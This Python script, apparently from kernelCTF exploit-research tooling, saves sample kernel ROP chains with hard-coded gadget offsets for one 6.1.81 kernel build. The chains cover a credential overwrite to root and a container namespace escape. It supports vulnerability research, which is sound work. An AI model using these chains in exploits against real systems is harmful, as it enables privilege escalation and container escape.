#!/usr/bin/env -S python3 -u
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Static sample writer for kernel_rop_generator."""

import argparse
import json
import os
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from kpwn_db.data_model.rop_chain import *
from kpwn_db.data_model.serialization import *

rop_actions = {
    "kernelctf/lts-6.1.81": [
        RopAction(
          type_id=0x01,
          description="msleep(ARG_time_msec)",
          gadgets=[
            RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
            RopChainArgument(argument_index=0),
            RopChainOffset(kernel_offset=0x227a50, description="msleep()")]),

        # commit_kernel_cred(prepare_kernel_cred(0))
        RopAction(
          type_id=0x02,
          description="commit_kernel_cred(prepare_kernel_cred(0))",
          gadgets=[
            RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
            RopChainConstant(value=0),
            RopChainOffset(kernel_offset=0x1be800, description="prepare_kernel_cred()"),
            RopChainOffset(kernel_offset=0x17caa80, description="mov rax, rdi"),
            RopChainOffset(kernel_offset=0x1be550, description="commit_kernel_cred()")]),

        # switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)
        RopAction(
          type_id=0x03,
          description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
          gadgets=[
            RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
            RopChainConstant(value=1),
            RopChainOffset(kernel_offset=0x1b4f20, description="find_task_by_vpid()"),
            RopChainOffset(kernel_offset=0x17caa80, description="mov rax, rdi"),
            RopChainOffset(kernel_offset=0x30cd, description="pop rsi"),
            RopChainOffset(kernel_offset=0x2876880, description="init_nsproxy"),
            RopChainOffset(kernel_offset=0x1bc9b0, description="switch_task_namespaces()")]),
    ]
}

if __name__ == "__main__":
  parser = argparse.ArgumentParser(
      description="Saves sample ROP Action chains into kernel-image-db"
  )
  parser.add_argument("kernel_image_db_path", help="Folder of the kernel-image-db tool")
  args = parser.parse_args()
  for (release_name, release_ras) in rop_actions.items():
    dst_fn = f"{args.kernel_image_db_path}/releases/{release_name}/rop_actions.json"
    with open(dst_fn, "wt") as f:
      f.write(to_json(release_ras, 4, RopActions))
